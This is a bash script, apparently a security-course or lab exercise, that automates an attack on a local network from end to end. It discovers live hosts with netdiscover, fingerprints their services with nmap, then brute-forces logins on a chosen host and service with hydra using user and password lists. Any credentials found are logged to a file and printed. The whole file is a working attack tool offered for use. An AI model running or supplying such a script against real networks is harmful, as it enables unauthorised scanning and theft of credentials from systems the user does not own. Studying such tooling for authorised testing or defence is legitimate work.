#!/bin/bash

#Getting the user's IP address.

User_IP=$(ifconfig | grep inet | head -n 1 | awk '{print $2}')

echo " Your current IP address is $User_IP "


#Scanning NAT network for any active hosts and saving the found IP Addresses into a text file. (Script automatically ignores the Host machine, NAT device and the DHCP Server)

echo " Scanning current LAN excluding Host machine, NAT device and DHCP Server . . ."


sudo netdiscover -r "$User_IP"/24 -P -N | grep -Fv '.1 ' | grep -Fv '.2 ' | grep -Fv '.254 ' | grep -v 'Active' > FoundHosts.txt

echo 'Scanning completed'
echo 'Lists of hosts saved into FoundHosts.txt'

#Running an nMap scan on the IP addresses found for active services and their versions. Also saves the results into another file to log information. 

Hosts_IP=$(cat FoundHosts.txt | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | awk '{print $1}')


for each_host in $Hosts_IP
do

	echo $each_host
	nmap -sV $each_host | tee -a vulnerablehosts.log
	
done

#All active hosts running services and versions will be displayed for user to view.


#Asking user to choose a target and a service to exploit. 

echo 'Input IP Address to exploit: '
read exploit_ip

echo 'Input service to exploit: '
read exploit_service

echo 'Input port number of service: '
read port_num

#Asking a user to input a file of list of users.

echo 'Input users list file path: '
read users_list 

#Asking the user to choose whether to input a password list file or create a password list on the spot.

echo 'Would you like to: 
A) Input a password list file path 
or
B) Create a Password list
Input A or B'

#Using hydra to attempt to bruteforce the chosen service with the list of users and either the list of passwords file or the list the user made.

function passwordoptions()
{
	
read PASSOPTIONS


case $PASSOPTIONS in

	A|a) 
		echo 'Input password list file path: '
		read pass_list
		hydra -L $users_list -P $pass_list $exploit_ip $exploit_service -s $port_num | grep -v 'illegal' | tee -a vulnerablehosts.log
		
	;;
	 
	 B|b)
		echo 'Input possible passwords with space in between each password. Press Enter when completed.'
		read new_pass_list  
		echo $new_pass_list | tr ' ' '\n' > PassList.txt
		hydra -L $users_list -P PassList.txt $exploit_ip $exploit_service -s $port_num | grep -v 'illegal' | tee -a vulnerablehosts.log 
		
	;;
	
	*) 
		echo 'Choose A or B'
		passwordoptions
	;;
	
esac
}
passwordoptions	

#Results will be shown and also printed into the log file created earlier.

echo 'Results saved into vulnerablehosts.log'

#User can view successful attempted credentials when inputting the scanned results. 

echo 'Input IP Address of scanned host: '
read scanned_ip

echo 'Showing possible credentials found from vulnerablehosts.log'
cat vulnerablehosts.log | grep $scanned_ip | grep host

echo 'Complete obtained information available in vulnerablehosts.log'
